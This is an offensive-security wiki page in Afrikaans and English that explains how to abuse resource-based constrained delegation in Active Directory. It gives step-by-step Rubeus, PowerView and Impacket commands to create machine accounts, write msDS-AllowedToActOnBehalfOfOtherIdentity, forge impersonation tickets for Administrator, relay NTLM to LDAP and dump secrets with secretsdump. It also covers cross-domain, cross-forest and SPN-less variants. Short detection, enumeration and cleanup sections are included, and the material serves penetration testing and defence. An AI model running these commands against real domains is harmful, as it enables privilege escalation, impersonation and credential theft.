# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basiese beginsels van Resource-based Constrained Delegation

Dit is soortgelyk aan die basiese [Constrained Delegation](constrained-delegation.md), maar **in plaas daarvan** om toestemmings aan ’n **object** te gee om **enige gebruiker teen ’n masjien te impersonate**. **Resource-based Constrain Delegation** **stel** in **die object wie enige gebruiker daarteen kan impersonate**.

In hierdie geval sal die constrained object ’n attribuut genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ hê, met die naam van die gebruiker wat enige ander gebruiker daarteen kan impersonate.

Nog ’n belangrike verskil tussen hierdie Constrained Delegation en die ander delegations is dat enige gebruiker met **write permissions oor ’n machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) die **_msDS-AllowedToActOnBehalfOfOtherIdentity_** kan stel. (In die ander vorme van Delegation was domain admin privs nodig.)

### Nuwe konsepte

In Constrained Delegation is daar verduidelik dat die **`TrustedToAuthForDelegation`**-flag binne die _userAccountControl_-waarde van die gebruiker nodig is om ’n **S4U2Self** uit te voer. Maar dit is nie heeltemal waar nie.\
Die werklikheid is dat jy selfs sonder daardie waarde ’n **S4U2Self** teen enige gebruiker kan uitvoer as jy ’n **service** is (’n SPN het), maar as jy **`TrustedToAuthForDelegation`** het, sal die teruggestuurde TGS **Forwardable** wees, en as jy nie daardie flag het nie, sal die teruggestuurde TGS nie **Forwardable** wees nie.

As die **TGS** wat in **S4U2Proxy** gebruik word egter **NOT Forwardable** is, sal ’n poging om ’n **basic Constrain Delegation** te abuseer nie werk nie. Maar as jy ’n **Resource-Based constrain delegation** probeer exploit, sal dit werk.

### Aanvalstruktuur

> As jy **write equivalent privileges** oor ’n **Computer**-account het, kan jy **privileged access** op daardie masjien verkry.

Gestel die aanvaller het reeds **write equivalent privileges oor die victim computer**.

1. Die aanvaller **compromises** ’n account wat ’n **SPN** het of **skep een** (“Service A”). Let daarop dat enige _Admin User_ sonder enige ander spesiale privilege tot 10 Computer-objects (**_MachineAccountQuota_**) kan **skep** en ’n **SPN** daarvoor kan stel. Die aanvaller kan dus eenvoudig ’n Computer-object skep en ’n SPN stel.
2. Die aanvaller **abuseer sy WRITE privilege** oor die victim computer (ServiceB) om **resource-based constrained delegation** te configureer sodat ServiceA enige gebruiker teen daardie victim computer (ServiceB) kan impersonate.
3. Die aanvaller gebruik Rubeus om ’n **full S4U attack** (S4U2Self en S4U2Proxy) vanaf Service A na Service B uit te voer vir ’n gebruiker met **privileged access tot Service B**.
1. S4U2Self (vanaf die SPN van die compromised/created account): Vra vir ’n **TGS van Administrator na my** (Not Forwardable).
2. S4U2Proxy: Gebruik die **not Forwardable TGS** van die vorige stap om ’n **TGS** van **Administrator** na die **victim host** te vra.
3. Selfs al gebruik jy ’n not Forwardable TGS, sal dit werk omdat jy Resource-based constrained delegation exploiteer.
4. Die aanvaller kan **pass-the-ticket** en die gebruiker **impersonate** om **access tot die victim ServiceB** te verkry.

Om die _**MachineAccountQuota**_ van die domain na te gaan, kan jy die volgende gebruik:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep 'n rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep met **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurering van hulpbron-gebaseerde Beperkte Delegasie

**Deur die activedirectory PowerShell-module te gebruik**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Deur powerview te gebruik**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Voer 'n volledige S4U-aanval uit (Windows/Rubeus)

Eerstens het ons die nuwe Computer object met die wagwoord `123456` geskep, dus het ons die hash van daardie wagwoord nodig:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dit sal die RC4- en AES-hashes vir daardie rekening druk.\
Nou kan die aanval uitgevoer word:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Jy kan meer tickets vir meer services genereer deur net een keer te vra met die `/altservice`-param van Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Let daarop dat gebruikers ’n attribuut genaamd "**Cannot be delegated**" het. As ’n gebruiker hierdie attribuut op True het, sal jy hom nie kan naboots nie. Hierdie eienskap kan binne bloodhound gesien word.

### Linux-nutsgoed: end-tot-end RBCD met Impacket (2024+)

As jy vanaf Linux werk, kan jy die volledige RBCD-ketting met die amptelike Impacket-nutsgoed uitvoer:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
- Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
- Impacket can rewrite the `sname` ("AnySPN") for some tools, but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

If the **delegating principal** you control lives in a **different domain** (or even a **different forest**) than the resource computer, the abuse is still **RBCD**, but the ticket flow is no longer the usual single-domain `S4U2Self -> S4U2Proxy`.

### Cross-domain RBCD: configure the foreign principal by SID

When you set `msDS-AllowedToActOnBehalfOfOtherIdentity` from a **different domain**, the foreign machine/user might **not be resolvable by name** in the target domain LDAP. In that case, configure the delegation entry using the **SID** of the foreign principal instead of its sAMAccountName/UPN.

This is especially relevant when relaying NTLM to LDAP with `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notas:
- `--sid` sê vir `ntlmrelayx.py` om `--escalate-user` as 'n SID te behandel, wat vereis word wanneer die delegating account foreign aan die target domain is.
- Selfs al druk die tool `User not found in LDAP`, kan die delegation write steeds slaag omdat die security descriptor die foreign SID direk stoor.

### Cross-domain RBCD: cross-realm S4U sequence

Sodra die foreign principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` is, is die werkende cross-domain-vloei:

1. Kry 'n **TGT** vir die delegating principal vanaf sy eie domein.
2. Versoek 'n **referral TGT** vir `krbtgt/<target-domain>`.
3. Versoek 'n **cross-realm S4U2Self referral** vir die gebruiker wat op die target-domain DC nageboots word.
4. Versoek die werklike **S4U2Self**-ticket vir daardie gebruiker terug in die delegator-domein.
5. Voer **S4U2Proxy** in die delegator-domein uit om 'n referral-ticket vir die target domain te kry.
6. Voer die finale **S4U2Proxy** op die target-domain DC uit om die service ticket vir `cifs/host.target`, `host/host.target`, ens. te verkry.

Dit is waarom stock Linux tooling dikwels in cross-domain RBCD misluk:
- die request **realm** moet moontlik verskil van die realm van die TGT wat in die `TGS-REQ` gebruik word
- die chain benodig **independent S4U2Proxy steps**, nie slegs **S4U2Self** of **S4U2Self** wat onmiddellik deur 'n enkele **S4U2Proxy** gevolg word nie

### Cross-domain RBCD vanaf Linux

Synacktiv het 'n Impacket `getST.py`-implementasie gepubliseer wat die cross-realm sequence vanaf Linux reproduseer deur die twee KDCs eksplisiet te hanteer:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operasioneel is die nuwe argumente:
- `-dc-ip`: DC van die **delegating** domein
- `-targetdomain`: domein van die **resource computer**
- `-targetdc`: DC van die **resource** domein

### Cross-forest RBCD-beperkings

Cross-forest RBCD het 'n belangrike beperking: **die gebruiker wat nageboots word, moet aan dieselfde forest as die delegating principal behoort**. Met ander woorde, as jou beheerde masjienrekening in `valhalla.local` is en die target resource in `asgard.local` is, kan jy oor die algemeen **nie arbitrêre `asgard.local`-gebruikers na daardie resource deur middel van RBCD naboots nie**.

Dit is steeds uitbuitbaar wanneer:
- die gebruiker in die **delegating forest** 'n **local admin** (of op 'n ander manier bevoorreg) op die resource-host in die ander forest is
- 'n trust die vereiste authentication path toelaat en die foreign SID in die target computer se security descriptor aanvaar word

### Cross-forest RBCD-protokol-eienaardighede

Cross-forest RBCD is nie bloot "cross-domain plus a trust" nie. Die waargenome flow sluit twee eienaardighede in wat algemene tooling histories mis:

1. 'n Bykomende **S4U2Proxy**-versoek wat `PA-PAC-OPTIONS=branch-aware` stel
2. 'n Finale service ticket wat moontlik deur middel van **RC4** teruggestuur word, selfs wanneer ander etypes versoek is

Die praktiese flow is:

1. Kry 'n TGT vir die delegating principal in forest A.
2. Versoek **S4U2Self** vir die impersonated user in forest A.
3. Versoek **S4U2Proxy** in forest A om 'n referral TGT vir forest B te verkry.
4. Stuur 'n tweede **S4U2Proxy** in forest A **sonder die S4U2Self-ticket as 'n additional ticket**, maar met `branch-aware` geaktiveer, om nog 'n referral TGT vir forest B te verkry.
5. Versoek opsioneel 'n normale service ticket in forest B vir die delegating principal (hierdie ticket word nie vir die finale abuse benodig nie).
6. Gebruik die referral tickets van stappe 3 en 4 om die finale **S4U2Proxy**-ticket in forest B aan te vra vir die impersonated forest-A-gebruiker na die target SPN.

### Cross-forest RBCD vanaf Linux

Dieselfde Synacktiv Impacket-branch voeg 'n `-forest`-switch vir hierdie logika by:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domeine)

In **multi-domein forests** kan beide **S4U2Self** en **S4U2Proxy** **rekursief** wees in plaas daarvan om ná een referral te stop:

- **Recursive S4U2Self**: die eerste `S4U2Self` word na die **domein van die gebruiker wat nageboots word** gestuur, intermediêre ouer-/kind-hoppe word met normale `TGS-REQ` referrals vir `krbtgt/<REALM>` deurkruis, en die **finale `S4U2Self`** word in die **delegerende prinsipaal se eie domein** gestuur.
- Dit beteken dat **die besit van slegs 'n TGT** vir 'n masjienrekening genoeg kan wees om 'n **admin van 'n ander domein in dieselfde forest** na te boots en `cifs/host`, `host/host`, `wsman/host`, ens. aan te vra.
- **Recursive S4U2Proxy** volg die trust chain op dieselfde manier: intermediêre hoppe hergebruik die vorige ticket as die TGT terwyl die volgende `krbtgt/<REALM>` referral aangevra word, en slegs die laaste hop lewer die finale service ticket terug.

'n Praktiese voorbeeld binne dieselfde forest is:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

As die **delegating principal 'n user sonder 'n SPN is**, misluk die laaste rekursiewe `S4U2Self` met **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Die workaround is om **slegs die finale hop as `S4U2Self+U2U` te herprobeer**.

Kort weergawe van die abuse chain:

1. Authenticate met die **NT hash** sodat die KDC na **RC4-HMAC (etype 23)** gedwing word.
2. Request eers **`-self -u2u`** en hou daardie ticket apart van die latere proxy-stap.
3. Extract die **TGT session key** met `describeTicket.py`.
4. Replace die user se **NT hash** met daardie **session key** deur `changepasswd.py -newhashes <session_key>` te gebruik.
5. Reuse die `S4U2Self+U2U` ticket as die **`-additional-ticket`** tydens 'n aparte **`-proxy`** request.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Bedryfsvoorbehoude:

- Wanneer die **eerste vertroude hop reeds 'n ander forest is**, verkies die **branch-aware**-algoritme (`getST.py ... -forest`) om by native Windows-gedrag te pas. As die foreign forest eers **later** in die ketting bereik word, kan die nie-branch-aware recursive flow steeds werk.
- Op onlangse **Windows Server 2022/2025** DCs kan geforseerde RC4 misluk met **`KDC_ERR_ETYPE_NOSUPP`** weens RC4-deprecation; dit kan **SPN-less RBCD** onmoontlik maak, selfs al werk klassieke SPN-backed RBCD steeds met AES.
- Voer **`S4U2Self+U2U`** uit voordat die gebruiker se hash/wagwoord verander word: **`SamrChangePasswordUser`** herbereken nie die account se Kerberos AES keys nie, dus kan die verandering van die wagwoord eerste latere ticket requests laat misluk.
- Die impersonated account moet steeds **delegable** wees: **Protected Users** en accounts met **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokkeer die ketting.

## Opsporing / hardening-notas

- RBCD-paaie oor domains/forests word steeds gewoonlik deur **ACL abuse** of **relay-to-LDAP** geskep. Dwing **LDAP signing** en **LDAP channel binding** op DCs af om algemene setup paths te breek.
- Oudit wie **`msDS-AllowedToActOnBehalfOfOtherIdentity`** op computer objects kan skryf en resolve die stored SIDs, insluitend **foreign security principals**.
- In trust-heavy environments, hersien **Selective Authentication**, **SID filtering**, en of users van 'n foreign forest **local admin**-regte op resource hosts het.

### Toegang verkry

Die laaste command line sal die **complete S4U attack uitvoer en die TGS** vanaf Administrator na die victim host in **memory** **inject**.\
In hierdie voorbeeld is 'n TGS vir die **CIFS**-service vanaf Administrator aangevra, dus sal jy toegang tot **C$** hê:
```bash
ls \\victim.domain.local\C$
```
### Misbruik verskillende service tickets

Leer meer oor die [**beskikbare service tickets hier**](silver-ticket.md#available-services).

## Enumerering, auditing en opruiming

### Enumerateer rekenaars met RBCD gekonfigureer

PowerShell (decoding the SD to resolve SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lees of spoel met een opdrag):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD skoonmaak / terugstel

- PowerShell (vee die attribute uit):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat kerberos opgestel is om nie DES of RC4 te gebruik nie en dat jy slegs die RC4-hash verskaf. Verskaf minstens die AES256-hash aan Rubeus (of verskaf net die rc4-, aes128- en aes256-hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tydens `-self` vir ’n normale gebruiker: die delegerende principal het waarskynlik **geen SPN nie**. Probeer die **laaste hop** weer as **`S4U2Self+U2U`** in plaas van ’n gewone **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** tydens **SPN-less RBCD**: onlangse DCs kan die geforseerde **RC4-HMAC**-pad wat deur die `S4U2Self+U2U` + sessiesleutel-substitusie-truuk vereis word, verwerp. Probeer eerder ’n klassieke **SPN-backed** RBCD-pad met AES.
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd op die huidige rekenaar van dié van die DC verskil en dat kerberos nie behoorlik werk nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om aan te meld nie. Jy het moontlik vergeet om die "$" binne die gebruikersnaam te plaas toe jy die hashes gegenereer het (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dit kan beteken:
- Die gebruiker wat jy probeer naboots, kan nie toegang tot die verlangde diens verkry nie (omdat jy dit nie kan naboots nie of omdat dit nie genoeg voorregte het nie)
- Die aangevraagde diens bestaan nie (as jy byvoorbeeld ’n ticket vir winrm aanvra, maar winrm nie loop nie)
- Die fakecomputer wat geskep is, het sy voorregte oor die kwesbare bediener verloor en jy moet dit weer aan hulle toeken.
- Jy misbruik klassieke KCD; onthou dat RBCD met nie-forwardable S4U2Self-tickets werk, terwyl KCD forwardable vereis.

## Notas, relays en alternatiewe

- Jy kan die RBCD SD ook oor Active Directory Web Services (ADWS) skryf indien LDAP gefilter word. Sien:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-relay-kettings eindig dikwels in RBCD om plaaslike SYSTEM in een stap te verkry. Sien praktiese end-tot-end-voorbeelde:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Indien LDAP-signing/channel binding **gedeaktiveer** is en jy ’n masjienrekening kan skep, kan tools soos **KrbRelayUp** ’n gedwonge Kerberos-auth na LDAP relay, `msDS-AllowedToActOnBehalfOfOtherIdentity` vir jou masjienrekening op die teikenrekenaarobjek stel, en **Administrator** onmiddellik via S4U vanaf ’n eksterne host naboots.

## Verwysings

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
